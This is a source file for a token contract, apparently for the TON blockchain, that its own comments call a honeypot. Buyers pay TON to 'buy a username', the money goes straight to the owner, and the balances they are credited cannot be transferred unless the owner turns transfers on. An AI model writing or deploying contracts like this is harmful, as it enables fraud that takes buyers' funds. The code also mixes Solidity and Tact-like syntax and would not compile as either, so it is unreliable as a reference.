// SPDX-License-Identifier: MIT

contract UsernameHoneypotToken {
    address owner;
    int usernamePrice;
    bool withdrawalsEnabled = false;

    map<address, int> balances;
    int totalSupply = 0;
    int decimals = 9;
    string name = "UsernameToken";
    string symbol = "USRNM";

    event Transfer(address from, address to, int value);
    event UsernameBought(address buyer, string username, int price);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    modifier withdrawalsAllowed() {
        require(withdrawalsEnabled || msg.sender == owner, "Withdrawals disabled");
        _;
    }

    init(int _usernamePrice) {
        owner = msg.sender;
        usernamePrice = _usernamePrice;
    }

    fun setUsernamePrice(int newPrice) onlyOwner {
        usernamePrice = newPrice;
    }

    // --- "Buy username" (TON is immediately sent to owner) ---
    fun buyUsername(string username) payable {
        require(msg.value == usernamePrice, "Incorrect TON amount sent");
        balances[msg.sender] += usernamePrice;
        totalSupply += usernamePrice;
        emit Transfer(0, msg.sender, usernamePrice);
        emit UsernameBought(msg.sender, username, usernamePrice);

        // Immediately forward TON to owner (user pays gas)
        send(owner, msg.value);
    }

    // --- ERC20-like (honeypot: no transfers for users) ---
    get fun balanceOf(address who): int {
        return balances[who];
    }
    get fun totalSupply(): int {
        return totalSupply;
    }
    fun transfer(address to, int amount) withdrawalsAllowed {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        require(to != 0, "Invalid address");
        balances[msg.sender] -= amount;
        balances[to] += amount;
        emit Transfer(msg.sender, to, amount);
    }

    fun setWithdrawalsEnabled(bool enabled) onlyOwner {
        withdrawalsEnabled = enabled;
    }

    fun renounceOwnership() onlyOwner {
        owner = 0;
    }
} 